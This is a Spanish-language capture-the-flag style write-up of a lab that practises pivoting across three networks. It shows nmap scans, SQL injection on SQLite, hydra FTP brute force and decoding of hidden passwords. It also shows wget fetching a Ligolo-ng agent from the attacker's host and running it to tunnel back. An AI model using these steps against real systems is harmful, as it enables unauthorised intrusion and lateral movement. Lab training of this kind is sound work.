# 📑 Writeup: Máquina DockHackLab 🚀

<img width="426" height="463" alt="image" src="https://github.com/user-attachments/assets/ffb551bf-d13f-4fc5-a273-65a3667984e9" />

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: hard](https://img.shields.io/badge/Dificultad-hard-%23FF0000?style=for-the-badge)

> **NOTA:** Esta máquina simula movimiento lateral (Pivoting) entre tres redes. No es un CTF de vulnerabilidad específica, según el creador de la máquina (PatxaSec).

---

# 🖥️ Primera Máquina — Hades (10.10.10.2)

## 🔍 Enumeración de Puertos y Servicios

```ruby
nmap -sV -Pn -sC --min-rate 5000 -O --top-port 50000 10.10.10.2
Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for 10.10.10.2
Host is up (0.00019s latency).
Not shown: 8384 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 7e:85:1a:70:b5:2e:c6:35:73:9b:64:77:ba:5f:72:8b (ECDSA)
|_  256 0a:67:56:22:1e:a1:aa:05:44:f0:b9:05:75:6d:9c:36 (ED25519)
80/tcp   open  http       Werkzeug httpd 3.0.4 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.4 Python/3.12.3
|_http-title: Not A CTF
2222/tcp open  tcpwrapped
MAC Address: 16:1E:63:32:B5:15 (Unknown)
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
```

### 📊 Información del Objetivo

| Categoría | Detalle |
| :--- | :--- |
| **Sistema Operativo** | Linux 4.15 - 5.19 |
| **Distancia de Red** | 1 salto (hop) |
| **Título del Sitio Web** | `Not A CTF` |

### ⚙️ Parámetros del Comando

| Parámetro | Descripción |
| :--- | :--- |
| **`-sV`** | Detecta versiones de los servicios |
| **`-Pn`** | Omite ping, asume el host como activo |
| **`-sC`** | Ejecuta scripts NSE por defecto |
| **`--min-rate 5000`** | Mínimo 5000 paquetes por segundo |
| **`-O`** | Detecta el sistema operativo |
| **`--top-ports 50000`** | Escanea los 50k puertos más comunes |

### 🔍 Servicios Detectados

| Puerto | Estado | Servicio | Versión |
| :--- | :--- | :--- | :--- |
| `22/tcp` | ✅ Abierto | SSH | OpenSSH 9.6p1 Ubuntu |
| `80/tcp` | ✅ Abierto | HTTP | Werkzeug httpd 3.0.4 (Python 3.12.3) |
| `2222/tcp` | ✅ Abierto | tcpwrapped | — |

---

## 🌐 Puerto 80 — Análisis Web

Al inspeccionar el puerto 80, confirmamos que el servidor corre bajo **Python/Werkzeug**. La interfaz presenta un diseño minimalista con el banner: *"¡Atención, esto no es un CTF!"*.

| Elemento | Observación |
| :--- | :--- |
| **Tecnología** | Python (Werkzeug) |
| **Interactividad** | Botón de cierre de banner informativo |
| **Propósito** | Práctica de Pivoting y post-explotación |

Como el front-end no ofrece vectores de ataque directos, inspeccionamos el **Código Fuente (`Ctrl+U`)**. En el footer localizamos un string codificado con credenciales SSH.

### 🔓 Decodificación de Credenciales

El string usa tres capas de ofuscación encadenadas:

| Herramienta | Función Técnica |
| :--- | :--- |
| **`base32 -d`** | Primera capa — alfabeto A-Z, 2-7 con padding `====` |
| **`base64 -d`** | Segunda capa — decodifica el resultado intermedio |
| **`xxd -r -p`** | Tercera capa — convierte hex a ASCII legible |

**Flujo de decodificación:**
1. **Entrada:** Cadena larga con padding `====`
2. **Paso 1 (Base32):** Resultado intermedio aún codificado
3. **Paso 2 (Base64):** Resultado en hexadecimal
4. **Paso 3 (XXD):** Traducción a caracteres legibles

```bash
echo 'STRING_DEL_FOOTER' | base32 -d | base64 -d | xxd -r -p
```

**Resultado:** `P0seidón2022!`

---

## 🚀 Pivoting con Ligolo-ng — Primer Salto (20.20.20.0/24)

**Ligolo-ng** crea un túnel TUN cifrado entre el atacante y la máquina comprometida, permitiendo enrutar tráfico hacia redes internas **sin proxychains**, de forma completamente transparente.

```
Atacante (10.0.2.15)
        │
        │  Túnel TLS — Puerto 11601
        ▼
Hades (10.10.10.2) ──────────► Red interna 20.20.20.0/24
```

### 📥 Paso 1 — Iniciar el Proxy en el Atacante

```bash
chmod +x proxy
./proxy -selfcert
```

```ruby
INFO[0000] Loading configuration file ligolo-ng.yaml
INFO[0002] Listening on 0.0.0.0:11601
    __    _             __                
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/
  Made in France ♥  by @Nicocha30! — Version: 0.8.3
```

| Componente | Descripción |
| :--- | :--- |
| **`-selfcert`** | Genera un certificado TLS auto-firmado para cifrar el túnel |
| **Puerto 11601** | Puerto por defecto donde el proxy escucha conexiones del agente |

### 🌐 Paso 2 — Transferir el Agente a Hades via wget

Levantamos un servidor HTTP en el atacante para servir el binario:

```bash
# En el atacante
mkdir ligolo && cd ligolo
python3 -m http.server 80
```

Desde la sesión SSH en **Hades**:

```bash
# En Hades
wget http://10.0.2.15/agent_linux_amd64 -O agent
chmod +x agent
./agent -connect 10.0.2.15:11601 -ignore-cert
```

| Acción | Comando | Descripción |
| :--- | :--- | :--- |
| **Descarga** | `wget http://10.0.2.15/agent_linux_amd64 -O agent` | Descarga el binario desde el atacante |
| **Permisos** | `chmod +x agent` | Otorga permisos de ejecución |
| **Conexión** | `./agent -connect 10.0.2.15:11601 -ignore-cert` | Conecta al proxy del atacante |

> **Nota Crítica:** `-ignore-cert` es necesario porque usamos un certificado auto-firmado con `-selfcert`. Sin este flag la conexión sería rechazada.

En la consola del proxy veremos:
```
INFO[0012] Agent connected — hades@10.10.10.2
```

### 🖧 Paso 3 — Crear la Interfaz TUN y Enrutar

```bash
# Crear la interfaz virtual
sudo ip link add dev ligolo type tun

# Levantar la interfaz
sudo ip link set ligolo up

# Enrutar la red interna a través del túnel
sudo ip route add 20.20.20.0/24 dev ligolo
```

| Paso | Comando | Propósito |
| :--- | :--- | :--- |
| **1. Crear TUN** | `sudo ip link add dev ligolo type tun` | Crea la interfaz virtual `ligolo` |
| **2. Levantar** | `sudo ip link set ligolo up` | Activa la interfaz |
| **3. Enrutar** | `sudo ip route add 20.20.20.0/24 dev ligolo` | Dirige el tráfico de la red interna por el túnel |

Verificamos que la ruta esté activa:
```bash
ip route | grep ligolo
# 20.20.20.0/24 dev ligolo scope link  ✅
```

> **Tip:** Verifica siempre con `ip route` que la ruta apunta correctamente a `ligolo`. Si no, el tráfico saldría por tu puerta de enlace predeterminada.

### 🚀 Paso 4 — Activar el Túnel

En la consola interactiva de Ligolo:

```
ligolo-ng » session    # Seleccionar el ID de la sesión de Hades
ligolo-ng » start      # Activar el intercambio de paquetes
```

**Estado del túnel:**
1. **Proxy Atacante:** Recibe la conexión y crea la sesión
2. **Agente Hades:** Mantiene el túnel abierto y redirige el tráfico
3. **Resultado:** Alcanzamos **20.20.20.0/24** directamente, sin proxychains ✅

---

# 🌊 Segunda Máquina — Poseidón (20.20.20.3)

Gracias al túnel activo, podemos lanzar `nmap` directamente sin proxychains.

## 🔍 Enumeración de Puertos

```ruby
nmap -sT -sCV -n -Pn 20.20.20.3
Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for 20.20.20.3
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Dojos El Papapasito del mar
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Estado | Servicio | Versión |
| :--- | :--- | :--- | :--- |
| `22/tcp` | ✅ Abierto | SSH | OpenSSH 8.4p1 Debian |
| `80/tcp` | ✅ Abierto | HTTP | Apache httpd 2.4.54 (Debian) |

---

## 🌐 Puerto 80 — Análisis Web

Gracias a Ligolo-ng, accedemos directamente desde el navegador a `http://20.20.20.3`.

<img width="1910" height="993" alt="image" src="https://github.com/user-attachments/assets/2ff132a4-f65e-4af5-9723-2fff8c600c37" />

La barra de navegación muestra tres apartados: **Buscar, Ranking y Perfil**. La sección **Buscar** nos lleva a un subdirectorio con un sistema de búsqueda.

<img width="1912" height="993" alt="image" src="https://github.com/user-attachments/assets/9e15e60b-fec5-46f3-8c6e-3154bbf1b7ae" />

---

## 🕵️ Explotación — SQLi sobre SQLite

Revisamos el código fuente para analizar cómo tramita la búsqueda:

<img width="652" height="366" alt="image" src="https://github.com/user-attachments/assets/3374b8e3-f9c8-406e-95bd-74d5e20bdc6f" />

El sistema hace **POST** a `database.php` con el parámetro del campo de búsqueda. Confirmamos **SQLite** inyectando directamente en el campo:

```sql
select name from sqlite_master
```

<img width="1011" height="344" alt="image" src="https://github.com/user-attachments/assets/8fe65f05-6aca-4f85-9c76-e736f6033c31" />

Tablas encontradas: **`usuarios`** y **`contrasena`**.

<img width="1004" height="353" alt="image" src="https://github.com/user-attachments/assets/e57ccbca-2d49-44d1-bbf3-dd85cb235fa7" />

<img width="1004" height="353" alt="image" src="https://github.com/user-attachments/assets/ed86b877-5fb3-42e5-9282-0c835736f923" />

---

## 🔓 Decodificación de Credenciales

Extraemos las contraseñas de los usuarios `poseidon` y `megalodon`. Aplicamos el mismo pipeline de decodificación que en Hades:

```bash
echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' | base32 -d | base64 -d | xxd -r -p
```

**Resultado:** `Templ02019!`

---

## 🔑 Acceso SSH y Escalada de Privilegios

```bash
ssh megalodon@20.20.20.3
# Contraseña: Templ02019!
```

<img width="908" height="624" alt="image" src="https://github.com/user-attachments/assets/86491aab-31cc-414f-8d21-1bf303083533" />

```bash
sudo bash   # ← sudo completo → root ✅
```

**Segunda máquina — Poseidón completada. ✅**

---

# ⚡ Tercera Máquina — Zeus (30.30.30.3)

## 🚀 Pivoting con Ligolo-ng — Segundo Salto (30.30.30.0/24)

Para alcanzar el segmento `30.30.30.0/24`, configuramos un **segundo salto de túnel** con Ligolo-ng. Poseidón actuará ahora como nuevo conector hacia la red interna de Zeus.

```
Atacante (10.0.2.15)
        │
        │  Túnel TLS — Puerto 11601
        ▼
Hades (10.10.10.2)
        │
        │  Túnel TLS — Puerto 11601
        ▼
Poseidón (20.20.20.3) ──────────► Red interna 30.30.30.0/24
                                           │
                                           ▼
                                   Zeus (30.30.30.3)
```

### 📥 Paso 1 — Transferir el Agente a Poseidón via wget

Con el túnel de Hades activo, Poseidón ya puede alcanzar nuestra IP atacante. Servimos el binario:

```bash
# En el atacante — servidor HTTP activo
python3 -m http.server 80
```

Desde la sesión en **Poseidón (root)**:

```bash
wget http://10.0.2.15/agent -O agent
chmod +x agent
```

### ⚙️ Paso 2 — Conectar el Segundo Agente

```bash
# En Poseidón
./agent -connect 10.0.2.15:11601 -ignore-cert
```

En la consola del proxy aparece la nueva sesión:

```
INFO[0035] Agent connected — poseidon@20.20.20.3
```

### 🖧 Paso 3 — Enrutar la Nueva Red

En el atacante añadimos la ruta hacia el tercer segmento:

```bash
sudo ip route add 30.30.30.0/24 dev ligolo
```

Verificamos ambas rutas activas:

```bash
ip route | grep ligolo
# 20.20.20.0/24 dev ligolo scope link  ✅
# 30.30.30.0/24 dev ligolo scope link  ✅
```

### 🚀 Paso 4 — Activar el Segundo Túnel

En la consola de Ligolo seleccionamos la sesión de Poseidón:

```
ligolo-ng » session    # Elegir el ID de Poseidón
ligolo-ng » start      # Activar el túnel
```

✅ Alcanzamos **30.30.30.0/24** directamente, sin proxychains.

---

## 🔍 Enumeración de Zeus

Con Ligolo activo usamos las herramientas directamente, sin proxychains:

```ruby
nmap -sT -sCV -n -Pn 30.30.30.3
```

| Puerto | Estado | Servicio |
| :--- | :--- | :--- |
| `21/tcp` | ✅ | FTP |
| `22/tcp` | ✅ | SSH |
| `80/tcp` | ✅ | HTTP — Apache (página default) |
| `139/tcp` | ✅ | SMB/Samba |
| `445/tcp` | ✅ | SMB/Samba |

---

## 👥 Puertos 139 y 445 — Auditoría Samba

```ruby
enum4linux -a 30.30.30.3
```

No hay directorios interesantes pero encontramos dos usuarios: **`hercules`** y **`rayito`**.

---

## 🌐 Puerto 80

Accedemos directamente desde el navegador a `http://30.30.30.3`. Vemos la página por defecto de Apache. El código fuente no revela nada y el fuzzing con **wfuzz** no encuentra subdirectorios.

---

## 📂 Puerto 21 — Fuerza Bruta FTP

Con los dos usuarios encontrados realizamos un ataque de diccionario usando una versión reducida del rockyou con las primeras 5000 contraseñas:

```ruby
hydra -L users -P minirock ftp://30.30.30.3
```

**Credenciales encontradas:** `hercules:thunder1`

---

## 🗃️ Obtención de Credenciales SSH desde FTP

```bash
ftp 30.30.30.3
# usuario: hercules | contraseña: thunder1
get archivo.exe
exit
```

Analizamos el binario con `strings` buscando cadenas codificadas:

```bash
strings archivo.exe | grep ==
```

<img width="601" height="431" alt="image" src="https://github.com/user-attachments/assets/32c29300-2d2f-49aa-9cc3-c0f33a3e495f" />

Encontramos un string codificado en **Base64** y lo decodificamos:

```ruby
echo 'AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=' | base64 -d
```

**Resultado:** `electrocut4c10n!`

---

## 🔑 Toma de Control — Root en Zeus

```bash
ssh rayito@30.30.30.3
# Contraseña: electrocut4c10n!

sudo bash   # ← sudo completo → root ✅
```

**Tercera máquina — Zeus completada. ✅**

---

# 🗺️ Resumen de Infraestructura

```
Atacante (10.0.2.15)
        │
        │  Ligolo-ng Túnel 1 — Puerto 11601
        ▼
Hades (10.10.10.2) ──────────────────── red 20.20.20.0/24
                                                │
                               Ligolo-ng Túnel 2 — Puerto 11601
                                                │
                                                ▼
                                Poseidón (20.20.20.3) ─── red 30.30.30.0/24
                                                                  │
                                                                  ▼
                                                          Zeus (30.30.30.3)
```

| Máquina | IP | Usuario | Contraseña |
| :--- | :--- | :--- | :--- |
| **Hades** | `10.10.10.2` | — | `P0seidón2022!` |
| **Poseidón** | `20.20.20.3` | `megalodon` | `Templ02019!` |
| **Zeus** | `30.30.30.3` | `rayito` | `electrocut4c10n!` |
